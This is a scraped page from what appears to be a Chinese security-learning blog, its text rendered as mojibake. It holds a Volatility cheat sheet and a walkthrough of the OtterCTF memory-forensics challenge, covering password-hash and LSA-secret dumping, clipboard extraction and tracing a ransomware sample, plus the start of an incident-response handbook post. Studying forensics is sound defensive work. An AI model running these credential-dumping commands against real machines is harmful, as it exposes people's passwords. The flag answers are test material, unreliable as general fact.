class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">volatility -f æ–‡ä»¶å imageinfo  		     	 å¾—åˆ°é•œåƒçš„åŸºæœ¬ä¿¡æ¯ã€‚</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ pslist		æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ pstree	    æŸ¥çœ‹è¿›ç¨‹æ ‘</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ hashdump		æŸ¥çœ‹ç”¨æˆ·åå¯†ç ä¿¡æ¯</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ john			çˆ†ç ´å¯†ç </span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ lsadump		æŸ¥çœ‹ç”¨æˆ·å¼ºå¯†ç </span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ svcscan		æŸ¥çœ‹æœåŠ¡</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ iehistory	æŸ¥çœ‹IEæµè§ˆå™¨å†å²è®°å½•</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ netscan		æŸ¥çœ‹ç½‘ç»œè¿æ¥</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ cmdscan		cmdå†å²å‘½ä»¤</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ consoles		å‘½ä»¤å†å²è®°å½•</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ cmdline		æŸ¥çœ‹cmdè¾“å‡ºï¼Œ è·å–å‘½ä»¤è¡Œä¸‹è¿è¡Œçš„ç¨‹åº   </span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ envars 		æŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼Œä¸€èˆ¬å¾ˆå¤šé…åˆgrepç­›é€‰ï¼Œå¯ä¹Ÿæ˜¯ä½¿ç”¨-pæŒ‡å®špid</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ filescan		æŸ¥çœ‹æ–‡ä»¶</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ notepad		æŸ¥çœ‹å½“å‰å±•ç¤ºçš„notepadå†…å®¹</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ hivelist		æŸ¥çœ‹æ³¨å†Œè¡¨é…ç½®å•å…ƒ</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ userassist	æŸ¥çœ‹è¿è¡Œç¨‹åºç›¸å…³çš„è®°å½•ï¼Œæ¯”å¦‚æœ€åä¸€æ¬¡æ›´æ–°æ—¶é—´ï¼Œè¿è¡Œè¿‡çš„æ¬¡æ•°ç­‰ã€‚</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ clipboard  	æŸ¥çœ‹å‰ªè´´æ¿çš„ä¿¡æ¯</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ timeliner	æœ€å¤§ç¨‹åºæå–ä¿¡æ¯</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ Dumpregistry	æå–æ—¥å¿—æ–‡ä»¶</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ dlllist		è¿›ç¨‹ç›¸å…³çš„dllæ–‡ä»¶åˆ—è¡¨ </span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ memdump -p xxx --dump-dir=./ 	æå–è¿›ç¨‹</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ dumpfiles -Q 0xxxxxxxx -D ./ 	æå–æ–‡ä»¶</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ procdump -p pid -D ./			è½¬å­˜å¯æ‰§è¡Œç¨‹åº  </span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ screenshot --dump-dir=./			å±å¹•æˆªå›¾</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ hivedump -o 0xfffff8a001032410 æŸ¥çœ‹æ³¨å†Œè¡¨é”®å</span><br><span class="line">volatility -f æ–‡ä»¶å --profile=ç³»ç»Ÿ printkey -K &quot;xxxxxxx&quot;			æŸ¥çœ‹æ³¨å†Œè¡¨é”®å€¼</span><br></pre></td></tr></table></figure>
<h3 id="OtterCTFå–è¯11é¢˜"><a class="header-anchor" href="#OtterCTFå–è¯11é¢˜">Â¶</a>OtterCTFå–è¯11é¢˜</h3>
<p>åœ¨åˆ†æä¹‹å‰ï¼Œéƒ½éœ€å…ˆæŸ¥çœ‹å½“å‰é•œåƒçš„ä¿¡æ¯ï¼Œè·å–æ˜¯å“ªä¸ªæ“ä½œç³»ç»Ÿï¼Œä½¿ç”¨imageinfoå‘½ä»¤æŸ¥çœ‹</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/7ed786d52f16b44d8d7d03b03c5ed059.png" alt="image-20221126101043895"></p>
<p>ç„¶åä½¿ç”¨volatilityå„ç±»å·¥å…·è¿›è¡Œåˆ†æå³å¯</p>
<h4 id="è·å–å¯†ç "><a class="header-anchor" href="#è·å–å¯†ç ">Â¶</a>è·å–å¯†ç </h4>
<p>volatility -f OtterCTF.vmem --profile=Win7SP1x64 hashdump	æŸ¥çœ‹ç”¨æˆ·åå¯†ç ä¿¡æ¯</p>
<p>volatility -f OtterCTF.vmem --profile=Win7SP1x64 lsadump		æŸ¥çœ‹ç”¨æˆ·å¼ºå¯†ç </p>
<p>ä½¿ç”¨johnçˆ†ç ´å¯†ç ä¸å‡ºå¯†ç å°è¯•lsadumpæŸ¥çœ‹ç”¨æˆ·å¼ºå¯†ç </p>
<p>lsadumpï¼šä»æ³¨å†Œè¡¨ä¸­æå–LSAå¯†é’¥ä¿¡æ¯,æ˜¾ç¤ºåŠ å¯†ä»¥åçš„æ•°æ®ç”¨æˆ·å¯†ç </p>
<p><img src="https://static.sechelper.com/img/2022/11/26/3b9f336be6bdcbbec4f185f817ec61d6.png" alt="img"></p>
<h4 id="pcçš„åç§°"><a class="header-anchor" href="#pcçš„åç§°">Â¶</a>pcçš„åç§°</h4>
<p>æŸ¥çœ‹ä¸»æœºå</p>
<p>hivelistæŸ¥çœ‹æ³¨å†Œè¡¨ä¿¡æ¯ï¼ŒæŸ¥çœ‹åˆ°system</p>
<p>æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯éƒ½ä¼šå­˜å‚¨åˆ°æ³¨å†Œè¡¨ï¼ŒSYSTEMç³»ç»Ÿä¿¡æ¯</p>
<p>hivelistæŸ¥çœ‹æ³¨å†Œè¡¨ç¬¬ä¸€çº§ä¿¡æ¯</p>
<p>ç¬¬ä¸€çº§åªæ˜¯ç›®å½•ï¼Œè·¯å¾„ä»£è¡¨æ–‡ä»¶å</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/1211edbbb2e9c0c93508b068720437b9.png" alt="img"></p>
<p>å¦‚æœä¸œè¥¿ä¸å¤šå¯ä»¥ hivedump  ä¸‹æ¥æŸ¥çœ‹ï¼Œå¦‚æœå¾ˆå¤šå¯ä»¥ç”¨printkeyä¸€æ­¥æ­¥æŸ¥çœ‹</p>
<p>æ‰€ä»¥æ–‡ä»¶çš„ä½ç½®ä½¿ç”¨åç§»é‡æ¥è¡¨ç¤ºï¼Œ0xå¼€å¤´ï¼Œä½¿ç”¨ printkeyæ‰“å°å‡ºæ¥ï¼Œå‚æ•°-oï¼Œç„¶åæ ¹æ®å¾—åˆ°çš„åç§»é‡ï¼Œæ‰¾åˆ°ç³»ç»Ÿæ³¨å†Œè¡¨åŒ…å«çš„å€¼</p>
<p>volatility -f OtterCTF.vmem --profile=Win7SP1x64 printkey -o 0xfffff8a000024010</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/3dfcbd23e4bd80ba6e2bf5a6703b954a.png" alt="img"></p>
<p>ç»§ç»­å¯»æ‰¾ç›´åˆ°æ‰¾åˆ°ComputerNameå…³é”®è¯ï¼Œåé¢çš„è·¯å¾„è¦ä½¿ç”¨ -K å‚æ•°ä½¿ç”¨ä¸€æ­¥æ­¥æ¥ï¼Œæ·±å…¥è·¯å¾„</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/bebe61de8a6cfbef30883ee6e01ef107.png" alt="img"></p>
<p><img src="https://static.sechelper.com/img/2022/11/26/994d55a1f564b7408070cadca5a9e47f.png" alt="img"></p>
<p>å«æœ‰ç›®å½•ä¸¤å±‚\ComputerName\ComputerNameï¼Œå¢åŠ æ··æ·†</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/251760b82eca60fe8bb5928a2da2ec83.png" alt="img"></p>
<h4 id="å†…å­˜æ­£åœ¨è¿è¡Œä»€ä¹ˆæ¸¸æˆï¼Œæ¸¸æˆè¿æ¥å“ªä¸ªæœåŠ¡å™¨"><a class="header-anchor" href="#å†…å­˜æ­£åœ¨è¿è¡Œä»€ä¹ˆæ¸¸æˆï¼Œæ¸¸æˆè¿æ¥å“ªä¸ªæœåŠ¡å™¨">Â¶</a>å†…å­˜æ­£åœ¨è¿è¡Œä»€ä¹ˆæ¸¸æˆï¼Œæ¸¸æˆè¿æ¥å“ªä¸ªæœåŠ¡å™¨</h4>
<p>æ¸¸æˆåº”è¯¥ä¼šè¿æ¥æœåŠ¡å™¨ï¼Œæ‰€ä»¥æŸ¥çœ‹ç½‘ç»œ</p>
<p>å¯»æ‰¾å¯ç–‘è¿›ç¨‹ï¼Œè¿æ¥å¤–éƒ¨ç½‘ç»œçš„è¿›ç¨‹</p>
<p>volatility -f OtterCTF.vmem --profile=Win7SP1x64 netscan		 å¯¹æ‰€æœ‰ç½‘ç»œè¿æ¥è¿›ç¨‹æ‰«æ</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/e9bf84cfd16d1454cb8c632a37c7d8a6.png" alt="img"></p>
<h4 id="è´¦æˆ·ç™»å½•è¿‡Lunar-3é¢‘é“ï¼Œè´¦æˆ·åæ˜¯ä»€ä¹ˆ"><a class="header-anchor" href="#è´¦æˆ·ç™»å½•è¿‡Lunar-3é¢‘é“ï¼Œè´¦æˆ·åæ˜¯ä»€ä¹ˆ">Â¶</a>è´¦æˆ·ç™»å½•è¿‡Lunar-3é¢‘é“ï¼Œè´¦æˆ·åæ˜¯ä»€ä¹ˆ</h4>
<p>å¯»æ‰¾ç™»å½•æ¸¸æˆé¢‘é“çš„æ¸¸æˆè´¦æˆ·åã€‚</p>
<p>éœ€è¦åœ¨æ¸¸æˆè¿›ç¨‹ä¸­æŸ¥çœ‹ï¼Œç”¨æˆ·ç™»å½•åˆ°è¿›ç¨‹ä¸­çš„è¯ï¼Œé‚£ä¹ˆå†…å­˜åº”è¯¥æœ‰ç™»å½•ç”¨æˆ·å</p>
<p>ä½¿ç”¨stringsè¿‡æ»¤å¯æ‰“å°å­—ç¬¦ä¸²ï¼Œgrepè¿‡æ»¤å«æœ‰å…³é”®å­—Lunar-3é¢‘é“å­—ç¬¦ä¸²</p>
<p>strings OtterCTF.vmem | grep Lunar-3 -A 5 -B 5</p>
<p>ï¼ˆ-A æŸ¥çœ‹å…³é”®è¯å‰å‡ è¡Œï¼Œ-BæŸ¥çœ‹å…³é”®è¯åå‡ è¡Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨-CæŸ¥çœ‹å‰åå‡ è¡Œï¼‰</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/845cf869a69a701c895eac0d6f106259.png" alt="img"></p>
<p>éƒ½å°è¯•ä¸€ä¸‹å‘ç°æ˜¯0tt3r8r33z3</p>
<p>stringså‘½ä»¤åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚</p>
<h4 id="å¯»æ‰¾ç™»å½•ååœ¨0x64-0x-6-8-0x40-0x06-0x-18-0x5a-0x0c-0x00-2-åçš„æ¸¸æˆå"><a class="header-anchor" href="#å¯»æ‰¾ç™»å½•ååœ¨0x64-0x-6-8-0x40-0x06-0x-18-0x5a-0x0c-0x00-2-åçš„æ¸¸æˆå">Â¶</a>å¯»æ‰¾ç™»å½•ååœ¨0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} åçš„æ¸¸æˆå</h4>
<p>æ„æ€æ˜¯ç”¨æˆ·åæ€»åœ¨è¿™ä¸ªç­¾åä¹‹åï¼š0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2}</p>
<p>å…ˆå°†LunarMS.exeè¿›ç¨‹è½¬å­˜å‡ºæ¥ï¼›-p pidå·</p>
<p>volatility -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D ./ 	æå–è¿›ç¨‹</p>
<p>å¯ä»¥ä½¿ç”¨010æŸ¥çœ‹ 5A 0C 00 ç‰‡æ®µ</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼šhexdump -C 708.dmp |grep â€œ5a 0c 00â€ -C 3</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/94dc5b0825e463bda0be815713d6aa19.png" alt="img"></p>
<p>å¯»æ‰¾5a 0c 00 ç‰‡æ®µçœ¼éƒ½å¿«æ‰¾èŠ±äº†ï¼Œå¤ªå¤šäº†</p>
<p>volatility -f OtterCTF.vmem --profile=Win7SP1x64 yarascan -Y â€œ/\x64(.{6,8})\x40\x06(.{18})\x5a\x0c\x00\x00/iâ€ -p 708</p>
<p>è¿™ä¸ªéœ€è¦å®‰è£…yarascanæ’ä»¶æ˜¯æœ€å¥½æ‰¾çš„</p>
<h4 id="å¯»æ‰¾ç»å¸¸å¤åˆ¶ç²˜è´´çš„è´¦å·å¯†ç "><a class="header-anchor" href="#å¯»æ‰¾ç»å¸¸å¤åˆ¶ç²˜è´´çš„è´¦å·å¯†ç ">Â¶</a>å¯»æ‰¾ç»å¸¸å¤åˆ¶ç²˜è´´çš„è´¦å·å¯†ç </h4>
<p>volatility -f OtterCTF.vmem --profile=Win7SP1x64 clipboard</p>
<p>clipboard  æŸ¥çœ‹å‰ªè´´æ¿çš„ä¿¡æ¯</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/3a1ab76ef529e9013644365d926302c0.png" alt="img"></p>
<h4 id="å¯»æ‰¾æ¶æ„è½¯ä»¶å"><a class="header-anchor" href="#å¯»æ‰¾æ¶æ„è½¯ä»¶å">Â¶</a>å¯»æ‰¾æ¶æ„è½¯ä»¶å</h4>
<p>ä¸€èˆ¬æ˜¯ä½¿ç”¨pslistæ¥æŸ¥çœ‹è¿›ç¨‹å¯»æ‰¾å¯ç–‘è¿›ç¨‹åï¼Œä½†ä¹Ÿæœ‰å¯èƒ½è¿›ç¨‹åè¿›è¡Œäº†æ··æ·†åˆ†è¾¨ä¸å‡ºæ¥æˆ–è€…è¢«åˆæ³•è¿›ç¨‹éšè—äº†</p>
<p>ä½¿ç”¨ pstree å‘½ä»¤å¯ä»¥æŸ¥çœ‹è¿›ç¨‹æ ‘ï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹å’Œä¾èµ–å…³ç³»</p>
<p>pstreeä»£è¡¨æŸ¥çœ‹å¸¦æ ‘ç»“æ„çš„è¿›ç¨‹åˆ—è¡¨ã€‚</p>
<p>å¯»æ‰¾å¯ç–‘è¿›ç¨‹ï¼šé€šè¿‡å¯»æ‰¾PPIDå¤§äºPIDçš„è¿›ç¨‹ï¼Œæˆ–æŸ¥çœ‹è¿›ç¨‹ä¾èµ–å¯»æ‰¾å¯ç–‘çš„</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/93a6362ce9e0dec32027bbacd84bd259.png" alt="img"></p>
<p>è¿™é‡Œmvware-tray.exeæ˜¯ppidå¤§äºpidçš„å¹¶ä¸”å¾ˆå¥‡æ€ªçš„æ˜¯Rick And Mortyçš„å­è¿›ç¨‹</p>
<p>dlllistä»£è¡¨æŸ¥çœ‹ä½¿ç”¨çš„åŠ¨æ€é“¾æ¥åº“æ˜¯å¦åˆæ³•ï¼Œ æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹ç›¸å…³çš„dllæ–‡ä»¶åˆ—è¡¨  ã€‚-pæŒ‡å®špidå·</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/ec78290c5074210669031794f30d469f.png" alt="img"></p>
<p>å‘ç°æ˜¯åœ¨tempç›®å½•ä¸‹è¿›è¡Œçš„ï¼Œä¸€çœ‹å°±ä¸æ˜¯æ­£ç»ç¨‹åºï¼Œ å› ä¸ºtempè¿™æ˜¯ä¸€ä¸ªä¸´æ—¶ç›®å½•</p>
<h4 id="æ¶æ„è½¯ä»¶æ˜¯å¦‚ä½•è¿›å…¥ç”µè„‘çš„"><a class="header-anchor" href="#æ¶æ„è½¯ä»¶æ˜¯å¦‚ä½•è¿›å…¥ç”µè„‘çš„">Â¶</a>æ¶æ„è½¯ä»¶æ˜¯å¦‚ä½•è¿›å…¥ç”µè„‘çš„</h4>
<p>å¯ä»¥æŸ¥çœ‹å’Œæ¶æ„è½¯ä»¶ç›¸å…³çš„æ–‡ä»¶</p>
<p>volatility -f 1.vmem --profile=Win7SP1x64 filescan	æŸ¥çœ‹æ–‡ä»¶</p>
<p>ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å¤ªå¤šï¼Œè¦åŠ è¿‡æ»¤ï¼Œæ¶æ„è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æ˜¯Rick And Morty</p>
<p>volatility -f 1.vmem --profile=Win7SP1x64 filescan | grep â€˜Rick And Mortyâ€™</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/d2f7b04b65dd34757f92ad111b7ffb2f.png" alt="img"></p>
<p>ä¸‰ä¸ªç§å­æ–‡ä»¶å’Œä¸‰ä¸ªexeæ–‡ä»¶ï¼›å¯»æ‰¾æ¥æºè¦å…³æ³¨ç§å­æ–‡ä»¶ï¼Œé‡Œé¢å¯èƒ½å«æœ‰åœ°å€ä¿¡æ¯</p>
<p>volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./ 	æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/d8b05d8be57e03af0af939db9cf79db7.png" alt="img"></p>
<p>åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œå‘ç° websiteå¯ç–‘ï¼Œåé¢å°±æ˜¯flag</p>
<h4 id="æ¶æ„è½¯ä»¶ç§å­ä»å“ªæ¥"><a class="header-anchor" href="#æ¶æ„è½¯ä»¶ç§å­ä»å“ªæ¥">Â¶</a>æ¶æ„è½¯ä»¶ç§å­ä»å“ªæ¥</h4>
<p>æŸ¥çœ‹è¿›ç¨‹å¯ä»¥å‘ç°æœ‰å¾ˆå¤šchromeæµè§ˆå™¨è¿›ç¨‹ï¼Œç§å­å¯èƒ½æ˜¯åœ¨æµè§ˆå™¨ä¸­ä¸‹è½½çš„</p>
<p>å…ˆæŠŠæ‰€æœ‰chromeè¿›ç¨‹è½¬å­˜ä¸‹æ¥</p>
<p>memdump -n chrome(æŒ‡å®šæ‰€æœ‰chromeè¿›ç¨‹) -D ./</p>
<p>å†æŸ¥æ‰¾ download.exe.torrent</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/fe8bb6a4b356293d7c158d25b15caa33.png" alt="img"></p>
<h4 id="é€šè¿‡æ¶æ„è½¯ä»¶å¯»æ‰¾æ”»å‡»è€…çš„æ¯”ç‰¹å¸åœ°å€"><a class="header-anchor" href="#é€šè¿‡æ¶æ„è½¯ä»¶å¯»æ‰¾æ”»å‡»è€…çš„æ¯”ç‰¹å¸åœ°å€">Â¶</a>é€šè¿‡æ¶æ„è½¯ä»¶å¯»æ‰¾æ”»å‡»è€…çš„æ¯”ç‰¹å¸åœ°å€</h4>
<p>é¢˜ç›®æè¿°è¯´æ”»å‡»è€…åœ¨æ¶æ„å‹’ç´¢è½¯ä»¶ä¸­ç•™ä¸‹äº†æ¯”ç‰¹å¸åœ°å€ï¼Œæ˜¯å¤šå°‘å‘¢ï¼Ÿ</p>
<p>é¦–å…ˆå¯ä»¥æŠŠæ¶æ„è¿›ç¨‹è½¬å­˜åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨IDAæŸ¥çœ‹å¯»æ‰¾æ¯”ç‰¹å¸ï¼Œé’±åŒ…ï¼Œæ”¯ä»˜ç­‰å…³é”®è¯ï¼Œå®šä½åœ°ç‚¹</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨dnSpyè¿›è¡Œé€†å‘åˆ†æ</p>
<p>ä¹Ÿå¯ä»¥æŠŠè½¬å‡ºçš„æ–‡ä»¶ä½¿ç”¨strings -e l è¿›è¡Œæœç´¢</p>
<p>strings -e l 3720.dmp | grep -i -A 5 â€œransomwareâ€</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/4374ac24d51e7ddd6445b4ad226345c1.png" alt="img"></p>
<h4 id="æ¶æ„è½¯ä»¶çš„å›¾åƒçš„éšè—ä¿¡æ¯"><a class="header-anchor" href="#æ¶æ„è½¯ä»¶çš„å›¾åƒçš„éšè—ä¿¡æ¯">Â¶</a>æ¶æ„è½¯ä»¶çš„å›¾åƒçš„éšè—ä¿¡æ¯</h4>
<p>procdump  å‘½ä»¤ä»£è¡¨è½¬å­˜å¯æ‰§è¡Œç¨‹åº</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/62728d4cafc7610252ef0066464dbcea.png" alt="img"></p>
<p>ä½¿ç”¨foremoståˆ†ç¦»å›¾ç‰‡</p>
<p><img src="https://static.sechelper.com/img/2022/11/26/1f46b9ec8a15824590ee3818866b13ec.png" alt="img"></p>
<p><img src="https://static.sechelper.com/img/2022/11/26/19ff35dbd3b090b2b8895bafe35629cc.png" alt="img"></p>
<p>æˆ–è€…ä½¿ç”¨åç¼–è¯‘æŸ¥çœ‹å›¾ç‰‡</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1><center>ç½‘ç»œå®‰å…¨åº”æ€¥å“åº”æ‰‹å†Œ</center></h1>
<h2><center>Linux ç³»åˆ—</center></h2>
<p><img src="https://static.sechelper.com/img/qrcode/qrcode-group-01.png" alt="qrcode"></p>
<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ä½œè€…ï¼šå›å¸ˆ@åŠ©å®‰ç¤¾åŒº</h3></center>
<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ç‰ˆæœ¬ï¼šv1.0.3</h3>
<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;å‘å¸ƒæ—¶é—´ï¼š2022/12/07</h3>
<div STYLE="page-break-after: always;"></div>
<p><em>ç½‘ç»œå®‰å…¨åº”æ€¥å“åº”æ‰‹å†Œ-Linuxç¯‡</em>æ˜¯<strong>åŠ©å®‰ç¤¾åŒº</strong>åŸåˆ›çš„åº”æ€¥å¹²è´§åˆé›†ï¼Œåç»­è¿˜ä¼šç»§ç»­æ›´æ–°<em>ç½‘ç»œå®‰å…¨åº”æ€¥å“åº”æ‰‹å†Œ-Windowsç¯‡</em>ç­‰ç³»åˆ—ã€‚æ­¤ç³»åˆ—æ–‡ç« å¯¹åº”bç«™è§†é¢‘è§‚çœ‹æ•ˆæœæ›´ä½³ã€‚æ‰«ç åŠ å…¥åŠ©å®‰ç¤¾åŒºäº¤æµç¾¤ï¼Œç¤¾åŒºå†…éƒ¨çº¢é˜Ÿæ²™é¾™ã€èµ„æºå…±äº«å’Œå¤§å‚å·¥ä½œç»éªŒã€‚çœŸæ­£<strong>çƒ­çˆ±å®‰å…¨</strong>å’Œå–œæ¬¢<strong>æŠ€æœ¯äº¤æµ</strong>çš„å°ä¼™ä¼´æ¬¢è¿åŠ å…¥æˆ‘ä»¬ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1FG4y1Y7UQ</span><br></pre></td></tr></table></figure>
<p>åº”æ€¥å“åº”æŒ‡é‡åˆ°é‡å¤§æˆ–çªå‘äº‹ä»¶åæ‰€é‡‡å–çš„æªæ–½å’Œè¡ŒåŠ¨ã€‚åº”æ€¥å“åº”æ‰€å¤„ç½®çš„çªå‘äº‹ä»¶ä¸ä»…ä»…åŒ…æ‹¬ç¡¬ä»¶ã€äº§å“ã€ç½‘ç»œã€é…ç½®ç­‰æ–¹é¢çš„æ•…éšœï¼Œä¹ŸåŒ…æ‹¬å„ç±»å®‰å…¨äº‹ä»¶ï¼Œå¦‚ï¼šé»‘å®¢æ”»å‡»ã€æœ¨é©¬ç—…æ¯’ã€å‹’ç´¢ç—…æ¯’ã€Webæ”»å‡»ç­‰ã€‚</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA-v1.0.3/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
